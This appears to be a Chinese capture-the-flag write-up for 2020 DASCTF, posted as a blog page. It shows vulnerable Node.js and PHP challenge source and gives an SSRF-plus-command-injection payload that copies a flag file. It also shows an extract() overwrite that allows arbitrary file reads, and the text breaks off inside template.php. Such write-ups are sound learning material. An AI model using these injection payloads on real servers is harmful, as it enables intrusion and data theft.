@@ -1,0 +1,464 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Err0r"><meta name="copyright" content="Err0r"><meta name="generator" content="Hexo 6.3.0"><meta name="theme" content="hexo-theme-yun"><title>2020DASctf-Writeup | Err0r</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script><!-- hexo-inject:begin --><!-- hexo-inject:end -->function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"err0r.top","root":"/","title":"云游君的小站","version":"1.10.9","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="Err0r" type="application/atom+xml"><meta name="description" content="2020DASCTF Write-up队伍名称：Test1024 队伍成员： gyy，Trick，X06 队伍情况：       继续学习吧，还是太菜了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020DASctf-Writeup">
+<meta property="og:url" content="https://err0r.top/article/dasctf2020/index.html">
+<meta property="og:site_name" content="Err0r">
+<meta property="og:description" content="2020DASCTF Write-up队伍名称：Test1024 队伍成员： gyy，Trick，X06 队伍情况：       继续学习吧，还是太菜了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201226160717993.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201226160703650.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201226161339893.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201228193214814.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201228193429000.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201228193732975.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201228193923701.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201228194027067.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201228194144848.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201228194307542.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201228194456072.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201228195508111.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201228195736671.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201228195943508.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201228203355447.png">
+<meta property="og:image" content="https://err0r.top/article/dasctf2020/image-20201228203737416.png">
+<meta property="article:published_time" content="2020-12-26T08:01:29.000Z">
+<meta property="article:modified_time" content="2021-03-30T11:49:09.618Z">
+<meta property="article:author" content="Err0r">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://err0r.top/article/dasctf2020/image-20201226160717993.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script><!-- hexo-inject:begin --><!-- hexo-inject:end -->// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Err0r"><img width="96" loading="lazy" src="/yun.png" alt="Err0r"></a><div class="site-author-name"><a href="/about/">Err0r</a></div><a class="site-name" href="/about/site.html">Err0r</a><sub class="site-subtitle">gyy</sub><div class="site-description">gugugu</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">43</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">11</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2020DASCTF-Write-up"><span class="toc-number">1.</span> <span class="toc-text">2020DASCTF Write-up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">1.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Easyjs"><span class="toc-number">1.1.1.</span> <span class="toc-text">Easyjs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Easyphp"><span class="toc-number">1.1.2.</span> <span class="toc-text">Easyphp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC"><span class="toc-number">1.2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A9%AC%E8%80%81%E5%B8%88%E7%9A%84%E7%A7%98%E7%B1%8D"><span class="toc-number">1.2.1.</span> <span class="toc-text">马老师的秘籍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FakePic"><span class="toc-number">1.2.2.</span> <span class="toc-text">FakePic</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://err0r.top/article/dasctf2020/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Err0r"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Err0r"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">2020DASctf-Writeup</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2020-12-26 16:01:29" itemprop="dateCreated datePublished" datetime="2020-12-26T16:01:29+08:00">2020-12-26</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2021-03-30 19:49:09" itemprop="dateModified" datetime="2021-03-30T19:49:09+08:00">2021-03-30</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Write-Up/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Write-Up</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/PHP/" style="--text-color:#8892BF"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">PHP</span></a><a class="tag-item" href="/tags/Python/" style="--text-color:#3776ab"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Python</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="2020DASCTF-Write-up"><a href="#2020DASCTF-Write-up" class="headerlink" title="2020DASCTF Write-up"></a>2020DASCTF Write-up</h2><p>队伍名称：Test1024</p>
+<p>队伍成员：</p>
+<p>gyy，Trick，X06</p>
+<p>队伍情况：</p>
+<hr>
+<img src="/article/dasctf2020/image-20201226160717993.png" class="" title loading="lazy">
+
+<img src="/article/dasctf2020/image-20201226160703650.png" class="" title="range" loading="lazy">
+
+<hr>
+<p>继续学习吧，还是太菜了</p>
+<span id="more"></span>
+
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Easyjs"><a href="#Easyjs" class="headerlink" title="Easyjs"></a>Easyjs</h4><p>2020网鼎杯线下半决赛web_babyJS，近乎原题</p>
+<p>打开即为空的json</p>
+<img src="/article/dasctf2020/image-20201226161339893.png" class="" title="image-20201226161339893" loading="lazy">
+
+<p>给了源码，关键web逻辑<code>routes\index.js</code></p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> config <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../config'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> url<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> child_process<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> fs<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> request<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">var</span> blacklist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'127.0.0.1.xip.io'</span><span class="token punctuation">,</span><span class="token string">'::ffff:127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'localhost'</span><span class="token punctuation">,</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token string">'[::1]'</span><span class="token punctuation">,</span><span class="token string">'::1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/debug'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'res'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">var</span> u<span class="token operator">=</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\"\']</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">let</span> log<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">echo  '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>href<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">'>>/tmp/log</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	child_process<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">data</span><span class="token operator">:</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/tmp/log'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/debug'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">var</span> u <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url<span class="token punctuation">;</span>
+	<span class="token keyword">var</span> urlObject<span class="token operator">=</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>urlObject<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">var</span> dest<span class="token operator">=</span>urlObject<span class="token punctuation">.</span>href<span class="token punctuation">;</span>
+		<span class="token function">request</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span>result<span class="token punctuation">,</span>body</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
+			res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+		res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre>
+
+<p>有个debug路径，请求会判断是不是本地回环访问，即<code>127.0.0.1</code>等，不是则返回空json。如果是本地访问就会读取get中url参数，去除单双引号用nodejs的url.parse解析，解析后的url拼接到shell命令中执行，输出<code>/tmp/log</code>再返回内容。</p>
+<p>由此，应先POST<code>/debug</code>， 在<code>url</code>参数中绕过blacklist，让程序再GET请求自己的<code>/debug</code>路径，之后构造注入命令。</p>
+<p>考察一个SSRF，构造payload：<code>&#123;&quot;url&quot;:&quot;http://127.0.0.2:10300/debug?url=http://%2527@xx&quot;&#125;</code>最后闭合引号</p>
+<p>然后考虑把flag文件复制到<code>/tmp/log</code>，利用<code>$IFS</code></p>
+<p>最终payload：<code>&#123;&quot;url&quot;:&quot;http://127.0.0.2:10300/debug?url=http://%2527;%2527@xx;cp$IFS/tmp/flag$IFS/tmp/log%00&quot;&#125;</code></p>
+<hr>
+<h4 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h4><p>神奇的phar反序列化</p>
+<p>源码</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/uploads/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'template.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$template</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tp1'</span><span class="token operator">=></span><span class="token string single-quoted-string">'tp1.tpl'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'tp2'</span><span class="token operator">=></span><span class="token string single-quoted-string">'tp2.tpl'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'tp3'</span><span class="token operator">=></span><span class="token string single-quoted-string">'tp3.tpl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$tp</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tp'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$tp</span><span class="token punctuation">,</span> <span class="token variable">$template</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"No! You only have 3 template to reader"</span><span class="token punctuation">;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">[</span><span class="token variable">$tp</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Please choice one template to reader"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>关键点<code>exract</code>，可见变量覆盖<code>template</code>再利用<code>tp</code>达到任意文件读取。不过不可能直接读flag的，先读了<code>template.php</code></p>
+<p><code>./?var[template][1]=template.php&amp;tp=1</code></p>
+<pre class="language-php" data-language="php"><code class="language-php">//template.php
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Template</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/&#123;&#123;([a-z]+)&#125;&#125;/"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".html"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span>
+                <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token keyword">global</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
